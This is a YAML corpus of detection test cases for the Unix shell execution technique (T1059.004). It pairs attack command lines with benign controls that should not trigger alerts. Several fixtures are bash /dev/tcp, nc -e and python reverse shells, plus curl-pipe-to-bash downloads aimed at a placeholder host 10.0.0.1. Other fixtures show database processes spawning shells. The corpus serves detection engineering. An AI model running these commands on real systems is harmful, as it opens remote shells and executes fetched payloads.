# 语料：执行类手法。命令行取自 Atomic Red Team 测试过程的原文，
# 归一化成本平台事件格式（process.cmd_line）。
technique: T1059.004
name: Unix Shell
cases:
  - name: bash 反弹 shell（/dev/tcp）
    source: atomic T1059.004
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

  - name: bash 双向 fd 反弹 shell（exec <>）
    source: atomic T1059.004
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: "bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'"

  - name: sh 输出接套接字、stdin 跟随
    source: 常见变体（PayloadsAllTheThings）
    class: 1007
    os: linux
    event:
      process:
        name: sh
        cmd_line: "/bin/sh -i > /dev/tcp/10.0.0.1/4444 0<&1 2>&1"

  - name: /dev/tcp 端口探测不是反弹 shell（良性对照）
    source: pve 宿主机运维脚本实测误报
    class: 1007
    os: linux
    expect: undetected
    event:
      process:
        name: bash
        cmd_line: "/usr/bin/bash -lc for hp in 10.1.1.11 10.1.1.30; do for p in 22 80 443; do timeout 3 bash -c \"echo > /dev/tcp/$hp/$p\" 2>/dev/null && echo \"$hp:$p OPEN\" || echo \"$hp:$p CLOSED\"; done; done"

  - name: 高位 fd 196 反弹 shell
    source: 常见变体（PayloadsAllTheThings）
    class: 1007
    os: linux
    event:
      process:
        name: sh
        cmd_line: "0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196"

  - name: exec 3<> 只读 banner 抓取不是反弹 shell（良性对照）
    source: pve 宿主机运维脚本实测误报
    class: 1007
    os: linux
    expect: undetected
    event:
      process:
        name: bash
        cmd_line: "bash -c echo JUMP_OK; timeout 6 bash -c 'exec 3<>/dev/tcp/36.133.115.51/22 && head -c 30 <&3' 2>/dev/null"

  - name: exec 3<> 发 HTTP 请求读回不是反弹 shell（良性对照）
    source: 生产 AI 调查 node_exporter 实测误报
    class: 1007
    os: linux
    expect: undetected
    event:
      process:
        name: bash
        cmd_line: "bash -c 'exec 3<>/dev/tcp/127.0.0.1/9100; printf \"GET /metrics HTTP/1.0\\r\\n\\r\\n\" >&3; head -c 120 <&3'; echo; timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/80; printf \"GET / HTTP/1.0\\r\\n\\r\\n\" >&3; head -c 200 <&3'"

  - name: exec 3<> 读命令 eval 回写套接字
    source: 常见变体（PayloadsAllTheThings）
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444; while read -r c <&3; do eval \"$c\" >&3; done'"

  - name: /dev/udp 探测带 2>&1 不是反弹 shell（良性对照）
    source: pve 宿主机运维脚本实测误报
    class: 1007
    os: linux
    expect: undetected
    event:
      process:
        name: bash
        cmd_line: "/usr/bin/bash -lc timeout 5 bash -c 'echo > /dev/udp/1.1.1.1/53' 2>&1 && echo ok"

  - name: nc -e 反连
    source: atomic T1059.004
    class: 1007
    os: linux
    event:
      process:
        name: nc
        cmd_line: "nc -e /bin/sh 10.0.0.1 4444"

  - name: python socket 反弹 shell
    technique: T1059.006
    source: atomic T1059.006
    class: 1007
    os: linux
    event:
      process:
        name: python3
        cmd_line: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444))'"

  - name: 下载后管道进 shell
    source: atomic T1059.004
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: "curl -s http://10.0.0.1/payload.sh | bash"

  - name: 普通 sh -c 执行（不该单独告警）
    source: atomic T1059.004 良性对照
    class: 1007
    os: linux
    expect: undetected
    event:
      process:
        name: sh
        cmd_line: "sh -c 'echo hello'"

  # 脚本里的 `curl … | bash`：shell 先 fork 出两个兄弟进程再接管道，两条命令行都不含 `|`，
  # 单事件告警规则看不到。两端各由一条信号规则命中（不单独告警），由时序规则
  # temporal:linux-download-pipe-shell 按「5 秒内共现、不论先后」关联（见 temporal-rules/README.md）
  - name: 脚本内管道下载执行——下载端 curl（信号）
    technique: T1105
    source: 实机回放第四轮 validation/replay/linux.sh
    class: 1007
    os: linux
    expect: signal
    event:
      process:
        name: curl
        file:
          path: /usr/bin/curl
        cmd_line: "curl -s --connect-timeout 3 http://10.0.0.1/payload.sh"

  - name: 脚本内管道下载执行——执行端 bash 读 stdin（信号）
    source: 实机回放第四轮 validation/replay/linux.sh
    class: 1007
    os: linux
    expect: signal
    event:
      process:
        name: bash
        file:
          path: /usr/bin/bash
        cmd_line: "bash"

  - name: PostgreSQL COPY FROM PROGRAM 拉起 sh（2026-11-03 生产库入侵原文）
    source: 生产事件 openxdr-node1 2026-11-03 00:09:53 UTC
    class: 1007
    os: linux
    event:
      process:
        name: sh
        file:
          path: /bin/sh
        cmd_line: "sh -c cat > /tmp/.pg_to_test; id > /tmp/.pg_to_out 2>&1; uname -a >> /tmp/.pg_to_out 2>&1"
        parent_process:
          name: postgres
          file:
            path: /usr/lib/postgresql/16/bin/postgres
          cmd_line: "postgres: postgres openxdr 10.1.1.170(41866) COPY"

  - name: MySQL UDF 拉起 bash
    source: 常见手法（lib_mysqludf_sys sys_exec）
    class: 1007
    os: linux
    event:
      process:
        name: bash
        file:
          path: /usr/bin/bash
        cmd_line: "bash -c curl http://10.0.0.1/x.sh | sh"
        parent_process:
          name: mysqld
          file:
            path: /usr/sbin/mysqld

  - name: PostgreSQL 启动时 locale -a 不是命令执行（良性对照）
    source: 生产事件 raid-server-test 2026-11-03
    class: 1007
    os: linux
    expect: undetected
    event:
      process:
        name: sh
        file:
          path: /bin/sh
        cmd_line: "sh -c -- locale -a"
        parent_process:
          name: postgres
          file:
            path: /usr/lib/postgresql/16/bin/postgres

